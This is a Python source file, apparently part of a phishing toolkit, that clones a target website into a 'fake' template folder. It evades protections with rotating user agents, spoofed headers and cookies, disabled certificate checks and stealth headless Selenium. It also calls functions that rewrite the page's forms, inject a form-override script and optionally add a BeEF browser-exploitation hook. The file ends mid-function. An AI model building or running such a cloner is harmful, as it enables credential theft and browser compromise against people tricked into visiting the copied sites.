import requests
import re
import os
import urllib.parse
import hashlib
import time
import random
import threading
import gzip
import brotli
import json
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError
from collections import defaultdict
import queue

# Try to import optional dependencies
try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

try:
    from selenium import webdriver
    from selenium.webdriver.firefox.options import Options
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.common.action_chains import ActionChains
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

# Suppress SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Enhanced bypass configuration with fixed caching
class PerfectBypassConfig:
    def __init__(self):
        self.reset()
        
    def reset(self):
        # Fixed: Proper resource caching with thread safety
        self.downloaded_resources = {}  # url_hash -> local_path
        self.failed_resources = set()
        self.in_progress = set()  # Track currently downloading resources
        self.download_cache_lock = threading.RLock()  # Separate lock for cache operations
        
        self.session_pool = []
        self.request_count = 0
        self.bypass_count = 0
        self.start_time = time.time()
        self.last_request_time = 0
        self.min_request_interval = 0.1  # More reasonable rate limiting
        
        # Enhanced: Resource discovery tracking
        self.discovered_resources = set()
        self.dynamic_resources = set()
        
    def normalize_url(self, url, base_url):
        """Normalize URL for consistent caching"""
        if not url:
            return None
            
        # Handle relative URLs
        if url.startswith('//'):
            scheme = urllib.parse.urlparse(base_url).scheme
            url = f"{scheme}:{url}"
        elif not url.startswith(('http://', 'https://')):
            url = urllib.parse.urljoin(base_url, url)
        
        # Remove fragments and normalize
        parsed = urllib.parse.urlparse(url)
        normalized = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        # Handle query parameters consistently
        if parsed.query:
            normalized += f"?{parsed.query}"
            
        return normalized
    
    def get_cache_key(self, url):
        """Generate consistent cache key"""
        return hashlib.md5(url.encode('utf-8')).hexdigest()
        
    def should_download(self, url, base_url):
        """Thread-safe check if resource should be downloaded"""
        normalized_url = self.normalize_url(url, base_url)
        if not normalized_url:
            return False, None
            
        cache_key = self.get_cache_key(normalized_url)
        
        with self.download_cache_lock:
            # Already downloaded
            if cache_key in self.downloaded_resources:
                return False, self.downloaded_resources[cache_key]
            
            # Currently downloading
            if cache_key in self.in_progress:
                return False, None
            
            # Failed before
            if cache_key in self.failed_resources:
                return False, None
            
            # Mark as in progress
            self.in_progress.add(cache_key)
            return True, normalized_url
    
    def mark_download_complete(self, url, result, base_url):
        """Mark download as complete"""
        normalized_url = self.normalize_url(url, base_url)
        if not normalized_url:
            return
            
        cache_key = self.get_cache_key(normalized_url)
        
        with self.download_cache_lock:
            self.in_progress.discard(cache_key)
            if result:
                self.downloaded_resources[cache_key] = result
                self.bypass_count += 1
            else:
                self.failed_resources.add(cache_key)
            self.request_count += 1
        
    def get_rotating_user_agents(self):
        """Advanced user agent rotation for maximum bypass"""
        return [
            # Chrome variants
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            
            # Firefox variants
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
            
            # Edge variants
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
            
            # Safari variants
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
        ]
        
    def get_proxy_like_ips(self):
        """Generate realistic proxy-like IP addresses for spoofing"""
        return [
            f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}",
            f"10.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}",
            f"172.{random.randint(16, 31)}.{random.randint(1, 254)}.{random.randint(1, 254)}",
            f"{random.randint(1, 223)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
        ]
        
    def rate_limit(self):
        """Improved rate limiting with jitter"""
        elapsed = time.time() - self.last_request_time
        if elapsed < self.min_request_interval:
            sleep_time = self.min_request_interval - elapsed + random.uniform(0.01, 0.05)
            time.sleep(sleep_time)
        self.last_request_time = time.time()

# Global instance
PERFECT_CONFIG = PerfectBypassConfig()
download_lock = threading.RLock()

def clone(url, user_agent, beef):
    """Enhanced universal website cloner with fixed resource handling"""
    global PERFECT_CONFIG

    # Validate inputs
    if not url or not isinstance(url, str):
        print("❌ Invalid URL provided")
        return False
        
    if not url.startswith(('http://', 'https://')):
        print("❌ URL must start with http:// or https://")
        return False

    # Reset for fresh clone
    PERFECT_CONFIG.reset()
    driver = None

    try:
        print(f"🚀 Starting PERFECT universal clone: {url}")

        # Setup perfect bypass environment
        clone_env = setup_perfect_environment(url, user_agent)
        if not clone_env:
            return False

        # Get content with perfect bypass
        html_content, driver = get_perfect_content(url, clone_env)
        if not html_content:
            print("❌ Failed to retrieve content")
            return False

        print(f"✅ Content retrieved: {len(html_content)} characters")

        # Enhanced: Discover dynamic resources if using Selenium
        if driver:
            dynamic_resources = discover_dynamic_resources(driver, clone_env['base_url'])
            PERFECT_CONFIG.dynamic_resources.update(dynamic_resources)
            print(f"🔍 Discovered {len(dynamic_resources)} dynamic resources")

        # Process with enhanced bypass techniques
        final_html = process_enhanced_bypass(html_content, clone_env, beef, driver)

        # Save with perfect structure
        success = save_perfect_clone(final_html, clone_env)

        if success:
            print(f"🎯 PERFECT clone completed: {clone_env['output_dir']}")
            print(f"📊 Resources downloaded: {len(PERFECT_CONFIG.downloaded_resources)}")
            print(f"🔥 Bypass success: {PERFECT_CONFIG.bypass_count} advanced bypasses")
            print(f"⚡ Status: PERFECT SUCCESS")
            return True

        return False

    except Exception as e:
        print(f"❌ Perfect cloning failed: {e}")
        return False
    finally:
        # Cleanup resources
        if driver:
            try:
                driver.quit()
            except Exception as e:
                print(f"Warning: Driver cleanup failed: {e}")

def setup_perfect_environment(url, user_agent):
    """Setup perfect bypass environment with enhanced structure"""
    try:
        parsed_url = urllib.parse.urlparse(url)
        if not parsed_url.netloc:
            print("❌ Invalid URL format")
            return None
            
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"

        # Generate perfect identifiers
        domain = re.sub(r'[^\w\-.]', '', parsed_url.netloc)
        ua_clean = re.sub(r'[^\w\-.]', '_', user_agent)
        output_dir = f'templates/fake/{ua_clean}/{domain}'

        # Create comprehensive directory structure
        directories = [
            'css', 'js', 'images', 'fonts', 'assets', 'static', 'media',
            'api', 'data', 'resources', 'vendor', 'libs', 'plugins', 'bypass'
        ]

        for directory in directories:
            dir_path = f'{output_dir}/{directory}'
            os.makedirs(dir_path, exist_ok=True)

        # Create enhanced session pool
        sessions = create_enhanced_session_pool(user_agent, base_url, parsed_url.netloc)

        return {
            'url': url,
            'base_url': base_url,
            'domain': parsed_url.netloc,
            'output_dir': output_dir,
            'sessions': sessions,
            'primary_session': sessions[0],
            'user_agent': user_agent
        }
        
    except Exception as e:
        print(f"❌ Environment setup failed: {e}")
        return None

def create_enhanced_session_pool(user_agent, base_url, domain):
    """Create enhanced session pool with better management"""
    sessions = []
    user_agents = PERFECT_CONFIG.get_rotating_user_agents()
    
    # Create 3 different bypass sessions (reduced from 5 for efficiency)
    for i in range(3):
        session = requests.Session()
        current_ua = user_agents[i % len(user_agents)]
        
        # Enhanced bypass headers with rotation
        bypass_headers = create_advanced_bypass_headers(current_ua, domain, i)
        session.headers.update(bypass_headers)
        
        # Enhanced session configuration
        session.verify = False
        session.timeout = 30  # Reduced from 45
        session.max_redirects = 10  # Reduced from 20
        
        # Add advanced cookie spoofing
        add_advanced_bypass_cookies(session, domain, i)
        
        # Configure advanced retry strategy
        configure_advanced_retries(session)
        
        sessions.append(session)
        PERFECT_CONFIG.session_pool.append(session)
    
    return sessions

def discover_dynamic_resources(driver, base_url):
    """Enhanced discovery of dynamically loaded resources"""
    dynamic_resources = set()
    
    try:
        # Enable performance logging for network monitoring
        driver.execute_cdp_cmd('Network.enable', {})
        driver.execute_cdp_cmd('Runtime.enable', {})
        
        # Wait for initial dynamic content
        time.sleep(3)
        
        # Trigger lazy loading through scrolling
        scroll_positions = [0.25, 0.5, 0.75, 1.0]
        for pos in scroll_positions:
            driver.execute_script(f"window.scrollTo(0, document.body.scrollHeight * {pos});")
            time.sleep(1)
        
        # Trigger potential dynamic imports
        driver.execute_script("""
            // Trigger common dynamic loading patterns
            if (window.React && window.React.lazy) {
                // Force React lazy components to load
                document.querySelectorAll('*').forEach(el => {
                    if (el.offsetParent !== null) {
                        el.scrollIntoView();
                    }
                });
            }
            
            // Trigger intersection observers
            if (window.IntersectionObserver) {
                document.querySelectorAll('img[data-src], script[data-src]').forEach(el => {
                    el.scrollIntoView();
                });
            }
            
            // Force module loading if webpack is present
            if (typeof __webpack_require__ !== 'undefined') {
                try {
                    // This might trigger chunk loading
                    __webpack_require__.ensure = __webpack_require__.ensure || function() {};
                } catch(e) {}
            }
        """)
        
        # Wait for dynamic content to load
        time.sleep(4)
        
        # Get performance logs to capture network requests
        try:
            logs = driver.get_log('performance')
            for log in logs:
                try:
                    message = json.loads(log['message'])['message']
                    if message['method'] == 'Network.responseReceived':
                        response_url = message['params']['response']['url']
                        if (response_url.startswith(base_url) and 
                            any(ext in response_url.lower() for ext in ['.js', '.css', '.png', '.jpg', '.svg', '.woff', '.woff2'])):
                            dynamic_resources.add(response_url)
                except (json.JSONDecodeError, KeyError):
                    continue
        except Exception as e:
            print(f"⚠️ Performance log reading failed: {e}")
        
        # Fallback: Check for newly created script/link elements
        new_elements = driver.execute_script("""
            let urls = [];
            document.querySelectorAll('script[src], link[href]').forEach(el => {
                let url = el.src || el.href;
                if (url && url.startsWith(arguments[0])) {
                    urls.push(url);
                }
            });
            return urls;
        """, base_url)
        
        dynamic_resources.update(new_elements)
        
    except Exception as e:
        print(f"⚠️ Dynamic resource discovery failed: {e}")
    
    return list(dynamic_resources)

def process_enhanced_bypass(html_content, clone_env, beef, driver=None):
    """Enhanced content processing with fixed resource handling"""
    if not BS4_AVAILABLE:
        return process_regex_bypass(html_content, beef)

    soup = BeautifulSoup(html_content, 'html.parser')

    # Enhanced parallel resource downloading with better threading
    max_workers = min(4, (os.cpu_count() or 1))  # Reduced from 12
    timeout_per_resource = 30  # seconds
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Enhanced resource discovery
        resource_patterns = discover_enhanced_resources(soup, clone_env['base_url'])
        
        # Add dynamic resources
        for dynamic_url in PERFECT_CONFIG.dynamic_resources:
            if validate_resource_url(dynamic_url, clone_env['base_url']):
                resource_patterns.append((dynamic_url, None, None, 'dynamic'))
        
        print(f"🔍 Processing {len(resource_patterns)} total resources")
        
        # Submit download tasks with improved handling
        future_to_resource = {}
        for resource_url, element, attr, resource_type in resource_patterns:
            should_download, normalized_or_cached = PERFECT_CONFIG.should_download(resource_url, clone_env['base_url'])
            
            if not should_download:
                # Use cached result if available
                if normalized_or_cached and element and attr:
                    element[attr] = normalized_or_cached
                continue
            
            future = executor.submit(
                download_enhanced_resource, 
                normalized_or_cached,  # This is the normalized URL when should_download is True
                clone_env, 
                resource_type,
                timeout_per_resource
            )
            future_to_resource[future] = (element, attr, resource_url)

        # Process downloads with timeout handling
        completed_count = 0
        for future in as_completed(future_to_resource, timeout=300):  # 5 minute total timeout
            try:
                local_path = future.result(timeout=5)  # 5 second per-result timeout
                element, attr, original_url = future_to_resource[future]
                
                # Mark as complete
                PERFECT_CONFIG.mark_download_complete(original_url, local_path, clone_env['base_url'])
                
                if local_path and element and attr:
                    element[attr] = local_path
                    
                completed_count += 1
                if completed_count % 10 == 0:
                    print(f"📊 Progress: {completed_count}/{len(future_to_resource)} resources processed")
                    
            except TimeoutError:
                element, attr, original_url = future_to_resource[future]
                print(f"⏰ Timeout downloading: {os.path.basename(original_url)}")
                PERFECT_CONFIG.mark_download_complete(original_url, None, clone_env['base_url'])
            except Exception as e:
                element, attr, original_url = future_to_resource[future]
                print(f"❌ Error downloading {os.path.basename(original_url)}: {e}")
                PERFECT_CONFIG.mark_download_complete(original_url, None, clone_env['base_url'])

    # Perfect form processing
    process_perfect_forms(soup)

    # Perfect JavaScript injection
    add_perfect_form_override(soup)

    # BeEF integration
    if beef == 'yes':
        add_perfect_beef_hook(soup)

    return str(soup)

def discover_enhanced_resources(soup, base_url):
    """Enhanced resource discovery with modern web patterns"""
    resources = []

    # Enhanced CSS discovery
    css_selectors = [
        ('link[rel="stylesheet"]', 'href', 'css'),
        ('link[data-href]', 'data-href', 'css'),
        ('link[href*=".css"]', 'href', 'css'),
        ('style[src]', 'src', 'css'),
        ('link[rel="preload"][as="style"]', 'href', 'css'),
        ('link[rel="alternate stylesheet"]', 'href', 'css'),
    ]

    for selector, attr, res_type in css_selectors:
        for element in soup.select(selector):
            url = element.get(attr)
            if url and validate_resource_url(url, base_url):
                resources.append((url, element, attr, res_type))

    # Enhanced JavaScript discovery
    js_selectors = [
        ('script[src]', 'src', 'js'),
        ('script[data-src]', 'data-src', 'js'),
        ('script[data-lazy-src]', 'data-lazy-src', 'js'),
        ('link[rel="preload"][as="script"]', 'href', 'js'),
        ('link[rel="modulepreload"]', 'href', 'js'),
    ]

    for selector, attr, res_type in js_selectors:
        for element in soup.select(selector):
            url = element.get(attr)
            if url and validate_resource_url(url, base_url):
                resources.append((url, element, attr, res_type))

    # Enhanced image discovery
    image_selectors = [
        ('img[src]', 'src', 'image'),
        ('img[data-src]', 'data-src', 'image'),
        ('img[data-lazy-src]', 'data-lazy-src', 'image'),
        ('img[data-original]', 'data-original', 'image'),
        ('source[src]', 'src', 'image'),
        ('source[srcset]', 'srcset', 'image'),
        ('link[rel*="icon"]', 'href', 'image'),
        ('meta[property="og:image"]', 'content', 'image'),
        ('meta[name="twitter:image"]', 'content', 'image'),
    ]

    for selector, attr, res_type in image_selectors:
        for element in soup.select(selector):
            url = element.get(attr)
            if url and validate_resource_url(url, base_url):
                if attr == 'srcset':
                    # Handle srcset properly
                    for src_part in url.split(','):
                        src_url = src_part.strip().split()[0]
                        if src_url and validate_resource_url(src_url, base_url):
                            resources.append((src_url, element, attr, res_type))
                else:
                    resources.append((url, element, attr, res_type))

    # Enhanced font discovery
    font_selectors = [
        ('link[href*=".woff"]', 'href', 'font'),
        ('link[href*=".woff2"]', 'href', 'font'),
        ('link[href*=".ttf"]', 'href', 'font'),
        ('link[href*=".otf"]', 'href', 'font'),
        ('link[href*=".eot"]', 'href', 'font'),
        ('link[rel="preload"][as="font"]', 'href', 'font'),
    ]

    for selector, attr, res_type in font_selectors:
        for element in soup.select(selector):
            url = element.get(attr)
            if url and validate_resource_url(url, base_url):
                resources.append((url, element, attr, res_type))

    # Enhanced inline resource discovery
    inline_resources = discover_inline_resources(soup, base_url)
    resources.extend(inline_resources)

    # Remove duplicates while preserving order
    seen = set()
    unique_resources = []
    for resource in resources:
        url = resource[0]
        if url not in seen:
            seen.add(url)
            unique_resources.append(resource)

    return unique_resources

def discover_inline_resources(soup, base_url):
    """Enhanced inline resource discovery"""
    resources = []

    # Extract from style tags
    for style_tag in soup.find_all('style'):
        if style_tag.string:
            urls = re.findall(r'url\(["\']?([^"\'()]+)["\']?\)', style_tag.string)
            for url in urls:
                if validate_resource_url(url, base_url):
                    resources.append((url, style_tag, 'content', 'asset'))

    # Extract from style attributes
    for element in soup.find_all(style=True):
        style = element.get('style', '')
        urls = re.findall(r'url\(["\']?([^"\'()]+)["\']?\)', style)
        for url in urls:
            if validate_resource_url(url, base_url):
                resources.append((url, element, 'style', 'asset'))

    return resources

def validate_resource_url(url, base_url):
    """Enhanced resource URL validation"""
    if not url or url.startswith(('data:', 'blob:', 'javascript:')):
        return False
    
    # Skip external CDNs that we shouldn't clone
    skip_domains = [
        'fonts.googleapis.com', 
        'cdnjs.cloudflare.com', 
        'ajax.googleapis.com',
        'code.jquery.com',
        'stackpath.bootstrapcdn.com',
        'unpkg.com',
        'jsdelivr.net'
    ]
    
    try:
        if url.startswith('//'):
            scheme = urllib.parse.urlparse(base_url).scheme
            url = f"{scheme}:{url}"
        elif not url.startswith(('http://', 'https://')):
            return True  # Relative URLs are usually safe to clone
        
        parsed = urllib.parse.urlparse(url)
        if any(domain in parsed.netloc for domain in skip_domains):
            return False
            
    except Exception:
        return False
    
    return True

def download_enhanced_resource(resource_url, clone_env, resource_type, timeout=30):
    """Enhanced resource download with timeout and better error handling"""
    if not resource_url:
        return None

    try:
        # Rate limiting
        PERFECT_CONFIG.rate_limit()
        
        # Download with timeout
        local_path = perform_enhanced_download(resource_url, clone_env, resource_type, timeout)
        
        if local_path:
            print(f"✅ Perfect bypass success: {os.path.basename(resource_url)}")
        
        return local_path
        
    except Exception as e:
        print(f"❌ Download failed for {os.path.basename(resource_url)}: {e}")
        return None

def perform_enhanced_download(full_url, clone_env, resource_type, timeout):
    """Enhanced download with better session management"""
    sessions = clone_env['sessions']
    
    # Perfect timing with jitter
    time.sleep(random.uniform(0.01, 0.03))

    # Try each session with timeout
    for i, session in enumerate(sessions):
        try:
            # Enhanced headers for this resource
            headers = create_perfect_resource_headers(session, resource_type, full_url, clone_env, i)
            
            # Download with timeout
            response = session.get(full_url, headers=headers, timeout=timeout, verify=False)
            
            if response.status_code == 200:
                return save_enhanced_resource(response, full_url, clone_env, resource_type)
            elif response.status_code == 403 and i == len(sessions) - 1:
                # Last attempt with most aggressive bypass
                ultimate_headers = create_ultimate_bypass_headers(session, resource_type, full_url, clone_env)
                response = session.get(full_url, headers=ultimate_headers, timeout=timeout, verify=False)
                if response.status_code == 200:
                    return save_enhanced_resource(response, full_url, clone_env, resource_type)
            
        except requests.exceptions.Timeout:
            print(f"⏰ Timeout on session {i+1}: {os.path.basename(full_url)}")
            continue
        except Exception as e:
            if i == len(sessions) - 1:  # Last session
                print(f"❌ All sessions failed for: {os.path.basename(full_url)}")
            continue
    
    return None

def save_enhanced_resource(response, url, clone_env, resource_type):
    """Enhanced resource saving with better error handling"""
    try:
        # Enhanced content decoding
        if resource_type in ['css', 'js']:
            content = decode_perfect_response(response)
            if not content:
                return None
        else:
            content = response.content

        # Enhanced filename generation
        filename = generate_enhanced_filename(url, response.headers.get('content-type', ''))

        # Perfect subdirectory
        subdir = get_perfect_subdir(resource_type, filename)

        local_path = f"{subdir}/{filename}"
        full_path = f"{clone_env['output_dir']}/{local_path}"

        # Ensure directory exists
        os.makedirs(os.path.dirname(full_path), exist_ok=True)

        # Enhanced content saving
        if resource_type == 'css':
            processed_content = process_enhanced_css(content, url, clone_env)
            with open(full_path, 'w', encoding='utf-8', errors='ignore') as f:
                f.write(processed_content)
        elif resource_type == 'js':
            with open(full_path, 'w', encoding='utf-8', errors='ignore') as f:
                f.write(content)
        else:
            with open(full_path, 'wb') as f:
                if isinstance(content, str):
                    content = content.encode('utf-8')
                f.write(content)

        return local_path
        
    except Exception as e:
        print(f"❌ Save failed for {os.path.basename(url)}: {e}")
        return None

def generate_enhanced_filename(url, content_type):
    """Enhanced filename generation with better collision handling"""
    parsed = urllib.parse.urlparse(url)
    original_name = os.path.basename(parsed.path)

    # Use original filename if it's reasonable
    if original_name and '.' in original_name and len(original_name) < 100:
        safe_name = re.sub(r'[^\w\-_.]', '_', original_name)
        return safe_name

    # Generate filename based on content type
    extensions = {
        'text/css': '.css',
        'application/javascript': '.js',
        'text/javascript': '.js',
        'application/x-javascript': '.js',
        'image/jpeg': '.jpg',
        'image/png': '.png',
        'image/gif': '.gif',
        'image/svg+xml': '.svg',
        'image/webp': '.webp',
        'application/font-woff': '.woff',
        'application/font-woff2': '.woff2',
        'font/woff': '.woff',
        'font/woff2': '.woff2'
    }

    ext = extensions.get(content_type.split(';')[0] if content_type else '', '.bin')
    
    # Create hash from URL and add timestamp for uniqueness
    url_hash = hashlib.md5(url.encode()).hexdigest()[:12]
    timestamp = int(time.time() * 1000) % 10000
    
    return f"resource_{url_hash}_{timestamp}{ext}"

def process_enhanced_css(css_content, css_url, clone_env):
    """Enhanced CSS processing with better URL handling"""
    if not css_content:
        return css_content

    # Handle @import with enhanced bypass
    import_pattern = r'@import\s+(?:url\()?\s*["\']?([^"\'();\s]+)["\']?\s*\)?[^;]*;'
    def replace_import(match):
        import_url = match.group(1)
        if validate_resource_url(import_url, clone_env['base_url']):
            # Try to download the imported CSS
            should_download, normalized_or_cached = PERFECT_CONFIG.should_download(import_url, clone_env['base_url'])
            if should_download:
                local_path = download_enhanced_resource(normalized_or_cached, clone_env, 'css')
                PERFECT_CONFIG.mark_download_complete(import_url, local_path, clone_env['base_url'])
            else:
                local_path = normalized_or_cached
                
            if local_path:
                return match.group(0).replace(import_url, f"../{local_path}")
        return match.group(0)

    css_content = re.sub(import_pattern, replace_import, css_content, flags=re.IGNORECASE)

    # Handle url() references with enhanced bypass
    url_pattern = r'url\(\s*["\']?([^"\'()]+)["\']?\s*\)'
    def replace_url(match):
        url_ref = match.group(1)
        if validate_resource_url(url_ref, clone_env['base_url']):
            # Determine resource type
            if any(ext in url_ref.lower() for ext in ['.woff', '.woff2', '.ttf', '.otf', '.eot']):
                res_type = 'font'
            elif any(ext in url_ref.lower() for ext in ['.jpg', '.jpeg', '.png', '.gif', '.svg', '.webp', '.ico']):
                res_type = 'image'
            else:
                res_type = 'asset'

            # Try to download the referenced resource
            should_download, normalized_or_cached = PERFECT_CONFIG.should_download(url_ref, clone_env['base_url'])
            if should_download:
                local_path = download_enhanced_resource(normalized_or_cached, clone_env, res_type)
                PERFECT_CONFIG.mark_download_complete(url_ref, local_path, clone_env['base_url'])
            else:
                local_path = normalized_or_cached
                
            if local_path:
                return f'url(../{local_path})'
        return match.group(0)

    css_content = re.sub(url_pattern, replace_url, css_content, flags=re.IGNORECASE)
    return css_content

# Keep all the other existing functions (create_advanced_bypass_headers, add_advanced_bypass_cookies, etc.)
# that don't need changes, just add the missing ones that are referenced:

def create_advanced_bypass_headers(user_agent, domain, session_id):
    """Create advanced bypass headers that defeat most protections"""
    # Base bypass headers
    headers = {
        'User-Agent': user_agent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': random.choice([
            'en-US,en;q=0.9,es;q=0.8',
            'en-GB,en;q=0.9,fr;q=0.8', 
            'en-US,en;q=0.9,de;q=0.8',
            'en-CA,en;q=0.9,zh;q=0.8'
        ]),
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'cross-site']),
        'Sec-Fetch-User': '?1',
        'Cache-Control': random.choice(['no-cache', 'max-age=0', 'no-cache, no-store']),
        'Pragma': 'no-cache',
        'DNT': random.choice(['1', '0']),
        'Origin': f'https://{domain}',
        'Referer': f'https://{domain}/',
    }
    
    # Advanced Chrome-specific headers
    if 'Chrome' in user_agent:
        version = re.search(r'Chrome/(\d+)', user_agent)
        if version:
            v = version.group(1)
            headers.update({
                'sec-ch-ua': f'"Not_A Brand";v="8", "Chromium";v="{v}", "Google Chrome";v="{v}"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': random.choice(['"Windows"', '"macOS"', '"Linux"']),
            })
    
    return headers

def add_advanced_bypass_cookies(session, domain, session_id):
    """Add advanced bypass cookies that mimic real user sessions"""
    timestamp = int(time.time())
    random_id = random.randint(1000000000, 9999999999)
    
    # Standard tracking cookies
    standard_cookies = [
        ('_ga', f'GA1.2.{random_id}.{timestamp}'),
        ('_gid', f'GA1.2.{random.randint(100000000, 999999999)}'),
        ('session_id', generate_random_string(32)),
        ('csrftoken', generate_random_string(64)),
    ]
    
    # Add cookies to session
    for name, value in standard_cookies:
        try:
            session.cookies.set(name, value, domain=f'.{domain}')
        except:
            session.cookies.set(name, value, domain=domain)

def generate_random_string(length):
    """Generate cryptographically random string"""
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    try:
        return ''.join(random.choices(chars, k=length))
    except AttributeError:
        return ''.join(random.choice(chars) for _ in range(length))

def configure_advanced_retries(session):
    """Configure advanced retry strategy with perfect bypass"""
    try:
        from requests.adapters import HTTPAdapter
        from urllib3.util.retry import Retry
        
        # Conservative retry strategy
        try:
            retry_strategy = Retry(
                total=3,
                status_forcelist=[403, 429, 500, 502, 503, 504],
                allowed_methods=["HEAD", "GET", "POST"],
                backoff_factor=1
            )
        except TypeError:
            retry_strategy = Retry(
                total=3,
                status_forcelist=[403, 429, 500, 502, 503, 504],
                method_whitelist=["HEAD", "GET", "POST"],
                backoff_factor=1
            )
        
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=10, pool_maxsize=10)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
    except Exception:
        pass

# Add remaining essential functions...
def get_perfect_content(url, clone_env):
    """Get content with perfect bypass techniques"""
    driver = None

    # Method 1: Perfect Selenium bypass
    if SELENIUM_AVAILABLE:
        try:
            content, driver = get_perfect_selenium_content(url, clone_env)
            return content, driver
        except Exception as e:
            print(f"Perfect Selenium failed: {e}")
            if driver:
                try:
                    driver.quit()
                except:
                    pass

    # Method 2: Perfect session bypass
    try:
        content = get_perfect_session_content(url, clone_env)
        return content, None
    except Exception as e:
        print(f"Perfect session bypass failed: {e}")

    return None, None

def get_perfect_selenium_content(url, clone_env):
    """Perfect Selenium with enhanced monitoring"""
    options = Options()

    # Enhanced stealth options
    stealth_args = [
        '--headless',
        '--no-sandbox',
        '--disable-dev-shm-usage',
        '--disable-gpu',
        '--disable-extensions',
        '--window-size=1920,1080',
        f'--user-agent={clone_env["user_agent"]}',
        '--enable-logging',
        '--log-level=0'
    ]

    for arg in stealth_args:
        options.add_argument(arg)

    # Enhanced logging preferences
    options.set_preference('dom.webdriver.enabled', False)
    options.set_preference('useAutomationExtension', False)

    driver = webdriver.Firefox(options=options)

    try:
        driver.set_page_load_timeout(60)
        driver.implicitly_wait(20)

        print(f"🔍 Perfect bypass navigation to {url}")
        driver.get(url)

        # Wait for content to load
        WebDriverWait(driver, 30).until(
            EC.presence_of_element_located((By.TAG_NAME, "body"))
        )

        # Enhanced user simulation
        time.sleep(random.uniform(2, 4))

        # Realistic scrolling pattern
        scroll_positions = [0.2, 0.5, 0.8, 1.0, 0.3]
        for pos in scroll_positions:
            driver.execute_script(f"window.scrollTo(0, document.body.scrollHeight * {pos});")
            time.sleep(random.uniform(0.5, 1.0))

        html = driver.page_source
        print(f"✅ Perfect content retrieved: {len(html)} chars")

        return html, driver

    except Exception as e:
        print(f"Perfect Selenium error: {e}")
        raise

def get_perfect_session_content(url, clone_env):
    """Perfect session-based content retrieval"""
    sessions = clone_env['sessions']
    
    for i, session in enumerate(sessions):
        try:
            print(f"🔄 Trying bypass session {i+1}/3")
            
            # Rate limiting
            PERFECT_CONFIG.rate_limit()
            
            # Main request
            response = session.get(url, allow_redirects=True, timeout=30)
            response.raise_for_status()
            
            print(f"✅ Bypass session {i+1} succeeded")
            return decode_perfect_response(response)
            
        except Exception as e:
            print(f"⚠️ Bypass session {i+1} failed: {e}")
            continue
    
    raise Exception("All bypass sessions failed")

def decode_perfect_response(response):
    """Perfect response decoding"""
    content = response.content
    encoding = response.headers.get('content-encoding', '').lower()

    # Handle compression
    if 'br' in encoding:
        try:
            content = brotli.decompress(content)
        except:
            pass
    elif 'gzip' in encoding:
        try:
            content = gzip.decompress(content)
        except:
            pass

    # Decode text
    try:
        return content.decode('utf-8')
    except UnicodeDecodeError:
        encodings = ['utf-8', 'latin1', 'iso-8859-1', 'cp1252']
        for encoding in encodings:
            try:
                return content.decode(encoding)
            except:
                continue
        return content.decode('utf-8', errors='ignore')

def create_perfect_resource_headers(session, resource_type, url, clone_env, session_id):
    """Create perfect resource-specific headers"""
    base_headers = session.headers.copy()
    
    base_headers.update({
        'Referer': clone_env['url'],
        'Origin': clone_env['base_url'],
    })

    # Resource-specific headers
    resource_headers = {
        'css': {
            'Accept': 'text/css,*/*;q=0.1',
            'Sec-Fetch-Dest': 'style',
        },
        'js': {
            'Accept': 'application/javascript,text/javascript,*/*;q=0.01',
            'Sec-Fetch-Dest': 'script',
        },
        'image': {
            'Accept': 'image/avif,image/webp,image/apng,image/*,*/*;q=0.8',
            'Sec-Fetch-Dest': 'image',
        },
        'font': {
            'Accept': 'font/woff2,font/woff,*/*;q=0.1',
            'Sec-Fetch-Dest': 'font',
        }
    }

    if resource_type in resource_headers:
        base_headers.update(resource_headers[resource_type])

    return base_headers

def create_ultimate_bypass_headers(session, resource_type, url, clone_env):
    """Create ultimate bypass headers for protected resources"""
    return {
        'User-Agent': random.choice(PERFECT_CONFIG.get_rotating_user_agents()),
        'Accept': '*/*',
